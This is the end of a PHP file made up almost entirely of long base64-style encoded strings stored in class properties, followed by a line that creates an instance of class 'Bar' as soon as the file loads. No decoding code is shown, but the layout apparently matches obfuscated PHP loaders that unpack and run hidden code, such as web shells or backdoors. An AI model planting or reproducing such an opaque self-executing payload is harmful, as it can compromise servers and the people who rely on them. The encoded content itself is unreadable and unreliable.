	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';
	 
	var $stable = 'XZDRS4RAEMafPbj/YVqEVZA6CaLD05cQLnqw1HqRkM1W9HBVdtfIov+9cXvpfJvZ75vffjN2d4IQKA3A
	rsYvLGvWKR5sN7acBbakJHAJanpTWjqqYb5jl1mcvsRpQY95/lgekyynr64HOw+uXRxsa6dVims0pvHT
	c5zlBS37E3pc+N5uLMs2X54jV05D828WnPUDHBP9o94lycN9XCwBV8xzLTDC31ZaTtzATL4LLkY9OziE
	85LrSfbApGTmyQO693f76pZ6sHA8c5klCq+aAeihHqQAVul26ENCQHDdDO8hGQelSXRo+3HSoOeRh0Tz
	T02gZwJrXGyl4gVEi/oH6yZsowj1qwUe0eAX';
}

new Bar();
?>